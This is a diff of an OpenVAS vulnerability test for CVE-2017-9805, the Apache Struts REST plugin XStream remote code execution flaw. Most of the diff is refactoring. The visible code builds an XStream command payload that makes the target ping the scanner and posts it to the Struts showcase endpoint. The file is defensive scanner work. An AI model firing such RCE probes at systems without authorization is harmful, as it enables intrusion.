@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_struts_rest_plug_xstream_rce_vuln.nasl 10317 2018-06-25 14:09:46Z cfischer $
+# $Id: gb_apache_struts_rest_plug_xstream_rce_vuln.nasl 11874 2018-10-12 11:28:04Z mmartin $
 #
 # Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability
 #
@@ -30,18 +30,18 @@ CPE = "cpe:/a:apache:struts";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811730");
-  script_version("$Revision: 10317 $");
+  script_version("$Revision: 11874 $");
   script_cve_id("CVE-2017-9805");
   script_bugtraq_id(100609);
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-06-25 16:09:46 +0200 (Mon, 25 Jun 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:28:04 +0200 (Fri, 12 Oct 2018) $");
   script_tag(name:"creation_date", value:"2017-09-07 16:39:09 +0530 (Thu, 07 Sep 2017)");
   script_name("Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
-  script_dependencies("webmirror.nasl", "os_detection.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 8080);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
@@ -59,44 +59,44 @@ if(description)
 
   script_tag(name:"impact", value:"Successfully exploiting this issue may allow
   an attacker to execute arbitrary code in the context of the affected application.
-  Failed exploit attempts will likely result in denial-of-service conditions.
-
-  Impact Level: System/Application");
+  Failed exploit attempts will likely result in denial-of-service conditions.");
 
   script_tag(name:"affected", value:"Apache Struts versions 2.5 through 2.5.12,
   2.1.2 through 2.3.33.");
 
   script_tag(name:"solution", value:"Upgrade to Apache Struts version 2.5.13
-  or 2.3.34 or later. For updates refer to,
-  http://struts.apache.org");
+  or 2.3.34 or later.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"exploit");
 
+  script_xref(name:"URL", value:"http://struts.apache.org");
   exit(0);
 }
 
 include("http_func.inc");
 include("misc_func.inc");
-include("http_keepalive.inc");
+
 include("host_details.inc");
 
-apachePort =  get_http_port( default:8080 );
+port = get_http_port(default:8080);
 
-actions = get_kb_list( "www/" + apachePort + "/content/extensions/action" );
-if( actions && is_array( actions ) ) found = TRUE;
+host = http_host_name(dont_add_port:TRUE);
+vtstring = get_vt_string();
 
-dos = get_kb_list( "www/" + apachePort + "/content/extensions/do" );
-if( dos && is_array( dos ) ) found = TRUE;
-
-jsps = get_kb_list( "www/" + apachePort + "/content/extensions/jsp" );
-if( jsps && is_array( jsps ) ) found = TRUE;
+foreach ext(make_list("action", "do", "jsp")){
+  exts = get_http_kb_file_extensions(port:port, host:host, ext:ext);
+  if(exts && is_array(exts)){
+    found = TRUE;
+    break;
+  }
+}
 
 if( ! found ) exit( 0 );
 
-host = http_host_name(port:apachePort);
+host = http_host_name(port:port);
 
-soc = open_sock_tcp(apachePort);
+soc = open_sock_tcp(port);
 if(!soc){
   exit(0);
 }
@@ -106,7 +106,7 @@ if(host_runs("Windows") == "yes"){
   win = TRUE;
 }else{
   ##For Linux and Unix platform
-  check = "__OpenVAS__" + rand_str(length:4);
+  check = "__" + vtstring + "__" + rand_str(length:4);
   pattern = hexstr(check);
   COMMAND = '<string>ping</string><string>-c</string><string>3</string><string>-p</string><string>' + pattern + '</string><string>'+ this_host() + '</string>';
 }
@@ -172,7 +172,7 @@ if(!len){
 }
 
 url = '/struts2-rest-showcase/orders/3';
-req = http_post_req( port: apachePort,
+req = http_post_req( port: port,
                      url: url,
                      data: data,
                      add_headers: make_array( 'Content-Type', 'application/xml'));
@@ -184,8 +184,8 @@ res = send_capture( socket:soc,
 close(soc);
 
 if(res && (win || check >< res)){
-  report = "It was possible to execute command remotely at " + report_vuln_url( port:apachePort, url:url, url_only:TRUE ) + " with the command '" + COMMAND + "'.";
-  security_message( port:apachePort, data:report);
+  report = "It was possible to execute command remotely at " + report_vuln_url( port:port, url:url, url_only:TRUE ) + " with the command '" + COMMAND + "'.";
+  security_message( port:port, data:report);
   exit(0);
 }
 
